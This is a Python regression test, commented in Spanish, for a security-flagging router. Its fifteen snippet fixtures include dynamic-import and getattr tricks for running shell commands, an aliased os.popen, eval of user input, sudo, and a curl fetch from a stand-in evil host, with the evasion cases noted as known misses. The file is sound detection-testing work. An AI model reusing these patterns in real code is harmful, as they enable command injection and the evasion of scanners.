#!/usr/bin/env python3
"""Regresión ZCode (ronda ROUTER_V5_R2).

Los 15 casos N01-N15 declarados en la OT R2, con sus expectativas.
Importa `router_v5`, ejecuta `axes_of()` y termina con salida distinta de
cero ante cualquier discrepancia.

Límites conocidos de resolución dinámica (fuera de esta ronda, quedan como
FN documentados si no hay una corrección segura que los resuelva):
  N04 import dinámico subprocess (`__import__('subprocess')`)
  N05 importlib más getattr (`importlib.import_module('os')` + getattr)

Cada caso: (nombre, rel_path, fuente, eje, esperado).
expected=True  -> el eje DEBERÍA aparecer (si no aparece: falso negativo).
expected=False -> el eje NO debería aparecer (si aparece: falso positivo).
"""
from __future__ import annotations

from router_v5 import axes_of, route

CASES = [
 ("N01 compile builtin", "m.py",
  "x = compile(src, '<s>', 'exec')\n", "seguridad", True),

 ("N02 ModuleType más exec", "m.py",
  "import types\nm = types.ModuleType('x')\nexec(c, m.__dict__)\n",
  "seguridad", True),

 ("N03 os.popen aliasado", "m.py",
  "from os import popen as run_cmd\nrun_cmd('ls')\n",
  "seguridad", True),

 ("N04 import dinámico subprocess", "m.py",
  "sp = __import__('subprocess')\nsp.run(c, shell=True)\n",
  "seguridad", True),

 ("N05 importlib más getattr", "m.py",
  "import importlib\nm = importlib.import_module('os')\ngetattr(m,'system')(c)\n",
  "seguridad", True),

 ("N06 placeholder angular", "config.py",
  "API_KEY = '<API_KEY>'\n", "seguridad", False),

 ("N07 changeme", "config.py",
  "PASSWORD = 'changeme'\n", "seguridad", False),

 ("N08 token numérico", "config.py",
  "token = '1234567890123456'\n", "seguridad", False),

 ("N09 secreto en f-string", "m.py",
  "pwd='hunter2real'\nx = f'auth: {pwd}'\n",
  "seguridad", True),

 ("N10 curl en sustitución", "d.sh",
  "x=$(curl https://evil.example)\n", "seguridad", True),

 ("N11 wget en string inerte", "d.sh",
  "echo 'wget is a tool'\n", "seguridad", False),

 ("N12 sudo", "d.sh",
  "sudo -n true\n", "seguridad", True),

 ("N13 template JS con eval", "a.js",
  "const x = `${eval(userInput)}`;\n", "seguridad", True),

 ("N14 regex JS con eval", "a.js",
  "const r = /eval()/g;\n", "seguridad", False),

 ("N15 window.eval", "a.js",
  "window.eval(userInput);\n", "seguridad", True),
]

failures = []
for name, path, src, axis, expected in CASES:
    axes = axes_of(path, src)
    actual = axis in axes
    passed = actual == expected
    kind = "" if passed else ("FN" if expected else "FP")
    print(f"{'PASS' if passed else 'FAIL'} {name}: expected={axis}={expected} actual={actual} axes={axes} {kind}")
    if not passed:
        evidence = [r for r in route(path, src)
                    if r["axis"] == axis and r["decision"] != "rejected"]
        failures.append({"name": name, "kind": kind, "axes": axes, "evidence": evidence})

print(f"\n{len(CASES) - len(failures)} PASS / {len(failures)} FAIL")
for item in failures:
    print(item)
raise SystemExit(bool(failures))
